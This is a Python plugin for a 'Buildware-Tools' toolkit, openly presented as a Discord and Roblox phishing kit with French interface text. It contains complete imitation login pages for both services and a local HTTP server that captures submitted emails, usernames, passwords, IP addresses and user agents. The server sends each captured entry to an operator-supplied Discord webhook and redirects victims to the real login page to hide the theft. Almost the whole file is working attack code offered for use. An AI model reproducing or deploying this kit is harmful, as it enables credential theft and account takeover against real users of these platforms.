# Discord-Roblox-PhishKit — Buildware-Tools Plugin
# Generates phishing pages for Discord & Roblox login
# Captured credentials are sent to your Discord webhook

import sys, os, subprocess, json, webbrowser, threading, time, random
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

from Core.Utils import *
from Core.Config import *

# -------------------------------------------------------------------
# Banner
# -------------------------------------------------------------------
phishkit_banner = r"""
   ╔══════════════════════════════════════════════════════╗
   ║   ██████  ██░ ██  ██▓  ██████  ██░ ██  ██ ▄█▀      ║
   ║ ▒█    ▒  ▓█▄ ▒▓██░ ██▒▒██    ▒ ▓██░ ██▒ ██▄█▒       ║
   ║ ░ ▓██▄   ▒██▄█▄▒▒██▀▀██░░ ▓██▄  ▒██▀▀██░▓███▄░       ║
   ║   ▒   ██▒▓███▄▒░░▓█ ░██  ▒   ██▒░▓█ ░██░▓██ █▄      ║
   ║ ▒██████▒▒▓██ █▄░░▓█▒░██▓▒██████▒▒░▓█▒░██░▒██▒ █▄    ║
   ║ ▒ ▒▓▒ ▒ ░▒██▒ █▄ ▒ ░░▒░▒▒ ▒▓▒ ▒ ░ ▒ ░░▒░░▒ ▒▒ ▓▒   ║
   ║ ░ ░▒  ░ ░▒ ▒▒ ▓▒ ▒ ░▒░ ░░ ░▒  ░ ░ ▒ ░▒░ ░░ ░▒ ▒░   ║
   ║ ░  ░  ░  ░ ░▒ ▒░ ░  ░░ ░░  ░  ░   ░  ░░ ░░ ░░ ░    ║
   ║       ░  ░ ░░ ░  ░  ░  ░      ░   ░  ░  ░░  ░      ║
   ╚══════════════════════════════════════════════════════╝
"""

# -------------------------------------------------------------------
# HTML Templates
# -------------------------------------------------------------------

DISCORD_HTML = r"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #313338; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.container { background: #1e1f22; padding: 40px; border-radius: 8px; width: 480px; box-shadow: 0 2px 10px rgba(0,0,0,0.3); }
.logo { text-align: center; margin-bottom: 20px; }
.logo svg { width: 130px; height: 40px; }
h2 { color: #f2f3f5; font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 8px; }
.subtitle { color: #b5bac1; font-size: 14px; text-align: center; margin-bottom: 24px; }
label { color: #b5bac1; font-size: 12px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; display: block; margin-bottom: 8px; }
.input-group { margin-bottom: 20px; }
.input-group input { width: 100%; padding: 10px 12px; background: #1e1f22; border: 1px solid #3f4147; border-radius: 4px; color: #f2f3f5; font-size: 16px; outline: none; transition: border 0.2s; }
.input-group input:focus { border-color: #5865f2; }
.btn { width: 100%; padding: 12px; background: #5865f2; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
.btn:hover { background: #4752c4; }
.btn:active { background: #3c45a5; }
.qr-link { text-align: center; margin-top: 12px; }
.qr-link a { color: #00a8fc; font-size: 14px; text-decoration: none; }
.qr-link a:hover { text-decoration: underline; }
.error { background: #f23f42; color: #fff; padding: 8px 12px; border-radius: 4px; margin-bottom: 16px; font-size: 14px; display: none; }
.footer { text-align: center; margin-top: 16px; }
.footer a { color: #00a8fc; font-size: 13px; text-decoration: none; margin: 0 8px; }
.footer a:hover { text-decoration: underline; }
.password-hint { color: #b5bac1; font-size: 12px; margin-top: 4px; }
</style>
</head>
<body>
<div class="container">
<div class="logo">
<svg viewBox="0 0 130 40"><path fill="#5865f2" d="M107.7 8.07A105.15 105.15 0 0081.47 0a72.06 72.06 0 00-3.36 6.83 97.68 97.68 0 00-29.05 0A72.37 72.37 0 0045.68 0a105.89 105.89 0 00-26.28 8.09C2.78 24.82-1.55 43.76.49 62.2c.01 0 0 .01 0 .01a105.69 105.69 0 0032.11 16.27c0-.01.01-.01.01-.02a79.37 79.37 0 006.87-11.15 69.49 69.49 0 01-10.82-5.2c.91-.66 1.8-1.34 2.66-2.03a75.09 75.09 0 0063.41 0c.87.69 1.76 1.37 2.66 2.03a69.32 69.32 0 01-10.8 5.19 79.37 79.37 0 006.87 11.15l.01.02A105.67 105.67 0 00129.9 62.2c2.29-22.49-5.82-41.28-22.2-54.13zM43.5 50.87c-3.87 0-7.05-3.55-7.05-7.9s3.12-7.9 7.05-7.9c3.94 0 7.12 3.55 7.05 7.9 0 4.35-3.14 7.9-7.05 7.9zm42.15 0c-3.87 0-7.05-3.55-7.05-7.9s3.12-7.9 7.05-7.9c3.94 0 7.12 3.55 7.05 7.9 0 4.35-3.14 7.9-7.05 7.9z"/></svg>
</div>
<h2>Bienvenue !</h2>
<p class="subtitle">Connectez-vous pour continuer</p>
<div class="error" id="errorMsg">Identifiants incorrects. Veuillez réessayer.</div>
<form id="loginForm" method="POST" action="/discord">
<div class="input-group">
<label>ADRESSE E-MAIL OU NUMÉRO DE TÉLÉPHONE</label>
<input type="text" name="email" placeholder="exemple@email.com" required>
</div>
<div class="input-group">
<label>MOT DE PASSE</label>
<input type="password" name="password" placeholder="Entrez votre mot de passe" required>
</div>
<button type="submit" class="btn">Connexion</button>
</form>
<div class="qr-link">
<a href="#">Se connecter avec un code QR</a>
</div>
<div class="footer">
<a href="#">Mot de passe oublié ?</a>
<a href="#">Nouveau sur Discord ?</a>
</div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    var email = this.querySelector('input[name="email"]').value.trim();
    var pass = this.querySelector('input[name="password"]').value.trim();
    if (!email || !pass) {
        e.preventDefault();
        document.getElementById('errorMsg').style.display = 'block';
    }
});
</script>
</body>
</html>"""

DISCORD_SUCCESS_HTML = r"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Redirection...</title>
<style>body{font-family:sans-serif;background:#313338;color:#f2f3f5;display:flex;justify-content:center;align-items:center;min-height:100vh;text-align:center}.box{background:#1e1f22;padding:40px;border-radius:8px;max-width:420px}.spinner{border:4px solid #3f4147;border-top:4px solid #5865f2;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
<meta http-equiv="refresh" content="3;url=https://discord.com/login">
</head>
<body>
<div class="box"><h2>Connexion réussie !</h2><p>Redirection vers Discord...</p><div class="spinner"></div></div>
</body>
</html>"""

ROBLOX_HTML = r"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Roblox</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Segoe UI', Tahoma, sans-serif; background: linear-gradient(135deg, #1b2030 0%, #2a3248 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.container { background: #131c26; border-radius: 16px; padding: 48px 40px; width: 400px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
.logo { text-align: center; margin-bottom: 32px; }
.logo svg { height: 56px; }
h2 { color: #fff; font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 8px; }
.subtitle { color: #8a9bb5; font-size: 14px; text-align: center; margin-bottom: 32px; }
.input-group { margin-bottom: 20px; }
.input-group label { color: #b0c4de; font-size: 14px; font-weight: 500; display: block; margin-bottom: 6px; }
.input-group input { width: 100%; padding: 12px 16px; background: #1a2635; border: 2px solid #2a3a50; border-radius: 8px; color: #fff; font-size: 16px; outline: none; transition: border 0.2s; }
.input-group input:focus { border-color: #00bcd4; }
.btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #00bcd4, #0097a7); color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: 700; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; margin-top: 8px; }
.btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,188,212,0.4); }
.btn:active { transform: translateY(0); }
.divider { text-align: center; margin: 20px 0; color: #5a6f8a; font-size: 13px; position: relative; }
.divider::before, .divider::after { content: ''; position: absolute; top: 50%; width: 42%; height: 1px; background: #2a3a50; }
.divider::before { left: 0; }
.divider::after { right: 0; }
.other-login { display: flex; gap: 12px; }
.other-login button { flex: 1; padding: 10px; background: #1a2635; border: 2px solid #2a3a50; border-radius: 8px; color: #b0c4de; cursor: pointer; font-size: 14px; transition: border 0.2s; }
.other-login button:hover { border-color: #00bcd4; }
.footer { text-align: center; margin-top: 24px; }
.footer a { color: #00bcd4; font-size: 13px; text-decoration: none; margin: 0 8px; }
.footer a:hover { text-decoration: underline; }
.error { background: rgba(244,67,54,0.2); border: 1px solid #f44336; color: #f44336; padding: 10px; border-radius: 8px; margin-bottom: 16px; font-size: 14px; display: none; text-align: center; }
</style>
</head>
<body>
<div class="container">
<div class="logo">
<svg viewBox="0 0 128 48" fill="none"><rect width="128" height="48" rx="8" fill="#131c26"/><text x="64" y="32" text-anchor="middle" fill="#00bcd4" font-size="28" font-weight="800" font-family="Arial">ROBLOX</text></svg>
</div>
<h2>Bienvenue</h2>
<p class="subtitle">Connectez-vous à votre compte Roblox</p>
<div class="error" id="errorMsg">Nom d'utilisateur ou mot de passe incorrect.</div>
<form id="loginForm" method="POST" action="/roblox">
<div class="input-group">
<label>Nom d'utilisateur</label>
<input type="text" name="username" placeholder="Entrez votre nom d'utilisateur" required>
</div>
<div class="input-group">
<label>Mot de passe</label>
<input type="password" name="password" placeholder="Entrez votre mot de passe" required>
</div>
<button type="submit" class="btn">Se connecter</button>
</form>
<div class="divider">ou</div>
<div class="other-login">
<button>Google</button>
<button>Apple</button>
</div>
<div class="footer">
<a href="#">Mot de passe oublié ?</a>
<a href="#">S'inscrire</a>
</div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    var user = this.querySelector('input[name="username"]').value.trim();
    var pass = this.querySelector('input[name="password"]').value.trim();
    if (!user || !pass) {
        e.preventDefault();
        document.getElementById('errorMsg').style.display = 'block';
    }
});
</script>
</body>
</html>"""

ROBLOX_SUCCESS_HTML = r"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Redirection...</title>
<style>body{font-family:sans-serif;background:#131c26;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;text-align:center}.box{background:#1a2635;padding:40px;border-radius:16px;max-width:420px}.spinner{border:4px solid #2a3a50;border-top:4px solid #00bcd4;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
<meta http-equiv="refresh" content="3;url=https://www.roblox.com/login">
</head>
<body>
<div class="box"><h2>Connexion réussie !</h2><p>Redirection vers Roblox...</p><div class="spinner"></div></div>
</body>
</html>"""

# -------------------------------------------------------------------
# Phishing HTTP Server
# -------------------------------------------------------------------
captured_credentials = []

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/" or path == "/discord":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(DISCORD_HTML.encode("utf-8"))
        elif path == "/roblox":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(ROBLOX_HTML.encode("utf-8"))
        elif path == "/style.css":
            self.send_response(200)
            self.send_header("Content-Type", "text/css")
            self.end_headers()
            self.wfile.write(b"")
        elif path == "/favicon.ico":
            self.send_response(204)
            self.end_headers()
        else:
            self.send_response(302)
            self.send_header("Location", "/discord")
            self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="ignore")
        params = parse_qs(body)

        parsed = urlparse(self.path)
        path = parsed.path

        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        ip = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "Unknown")

        entry = {
            "timestamp": timestamp,
            "ip": ip,
            "user_agent": user_agent,
            "type": "",
            "credentials": {}
        }

        if path == "/discord":
            email = params.get("email", [""])[0]
            password = params.get("password", [""])[0]
            entry["type"] = "Discord"
            entry["credentials"] = {"email": email, "password": password}
            captured_credentials.append(entry)

            # Envoi immédiat au webhook
            threading.Thread(target=SendCredsToWebhook, args=(entry,), daemon=True).start()

            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(DISCORD_SUCCESS_HTML.encode("utf-8"))

        elif path == "/roblox":
            username = params.get("username", [""])[0]
            password = params.get("password", [""])[0]
            entry["type"] = "Roblox"
            entry["credentials"] = {"username": username, "password": password}
            captured_credentials.append(entry)

            threading.Thread(target=SendCredsToWebhook, args=(entry,), daemon=True).start()

            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(ROBLOX_SUCCESS_HTML.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass  # Suppress HTTP server logs


def SendCredsToWebhook(entry):
    """Envoie les credentials capturés au webhook Discord."""
    global webhook_url

    if entry["type"] == "Discord":
        fields = [
            {"name": "📧 Email", "value": f"```{entry['credentials']['email']}```", "inline": True},
            {"name": "🔑 Mot de passe", "value": f"```{entry['credentials']['password']}```", "inline": True},
            {"name": "🌐 IP", "value": f"```{entry['ip']}```", "inline": True},
            {"name": "🕐 Timestamp", "value": f"```{entry['timestamp']}```", "inline": True},
        ]
        color = 0x5865f2  # Discord blurple
        title = "🎣 Discord Credentials Captured!"
    else:
        fields = [
            {"name": "👤 Username", "value": f"```{entry['credentials']['username']}```", "inline": True},
            {"name": "🔑 Mot de passe", "value": f"```{entry['credentials']['password']}```", "inline": True},
            {"name": "🌐 IP", "value": f"```{entry['ip']}```", "inline": True},
            {"name": "🕐 Timestamp", "value": f"```{entry['timestamp']}```", "inline": True},
        ]
        color = 0x00bcd4  # Roblox cyan
        title = "🎣 Roblox Credentials Captured!"

    embed = {
        "title": title,
        "color": color,
        "fields": fields,
        "footer": {"text": "Buildware-Tools | PhishKit"},
        "timestamp": datetime.utcnow().isoformat()
    }

    payload = {
        "username": "Buildware-Tools | PhishKit",
        "avatar_url": "https://i.imgur.com/G8QR0f7.png",
        "embeds": [embed]
    }

    try:
        requests.post(webhook_url, json=payload, timeout=10)
    except Exception:
        pass


def StartPhishingServer(port, target_type):
    """Démarre le serveur HTTP de phishing."""
    server = HTTPServer(("0.0.0.0", port), PhishingHandler)
    print(f"{SUCCESS} Serveur phishing démarré sur {red}http://0.0.0.0:{port}{white}", reset)
    print(f"{INFO} Page Discord   : {red}http://localhost:{port}/discord{white}", reset)
    print(f"{INFO} Page Roblox    : {red}http://localhost:{port}/roblox{white}", reset)
    print()
    print(f"{INFO} Envoie les credentials vers le webhook configuré.", reset)
    print(f"{INFO} Appuie sur {red}Ctrl+C{white} pour arrêter le serveur.", reset)
    print()

    # Ouvrir le navigateur
    if target_type == "discord":
        webbrowser.open(f"http://localhost:{port}/discord")
    elif target_type == "roblox":
        webbrowser.open(f"http://localhost:{port}/roblox")
    else:
        webbrowser.open(f"http://localhost:{port}")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{INFO} Serveur arrêté.", reset)
        server.shutdown()

# -------------------------------------------------------------------
# Main
# -------------------------------------------------------------------
webhook_url = None  # Will be set globally

Title("Discord-Roblox-PhishKit")
Scroll(GradientBanner(phishkit_banner))

try:
    Scroll(f"""
 {INFO} Ce plugin crée un serveur de phishing local avec
 {INFO} des pages de connexion factices pour :
 {INFO}   • Discord (email + mot de passe)
 {INFO}   • Roblox  (username + mot de passe)
 {INFO}
 {INFO} Les credentials saisis sont instantanément envoyés
 {INFO} à un webhook Discord de votre choix.
    """)

    # --- Choix du webhook ---
    print(f"{LOADING} Configuration du webhook d'exfiltration..", reset)
    webhook_url = ChoiceWebhook()
    print()

    # --- Choix du port ---
    try:
        port_input = input(f"{INPUT} Port du serveur {red}({white}8080{red}){white} -> ").strip()
        port = int(port_input) if port_input else 8080
        if port < 1 or port > 65535:
            port = 8080
    except ValueError:
        port = 8080

    # --- Choix de la cible ---
    print()
    print(f" {INFO} Quel type de page de phishing lancer ?", reset)
    print(f" {PREFIX}1{SUFFIX} {red}Discord{white} — Page de connexion Discord", reset)
    print(f" {PREFIX}2{SUFFIX} {red}Roblox{white}  — Page de connexion Roblox", reset)
    print(f" {PREFIX}3{SUFFIX} {red}Les deux{white} — Les deux pages accessibles", reset)
    print()

    target_choice = input(f"{INPUT} Choix {red}({white}1-3{red}){white} -> ").strip()
    target_map = {"1": "discord", "2": "roblox", "3": "both"}
    target_type = target_map.get(target_choice, "both")

    print()
    print(f"{LOADING} Démarrage du serveur de phishing..", reset)
    time.sleep(0.5)
    print()

    # --- Lancement ---
    StartPhishingServer(port, target_type)

    Continue()
    Reset()

except Exception as e:
    Error(e)
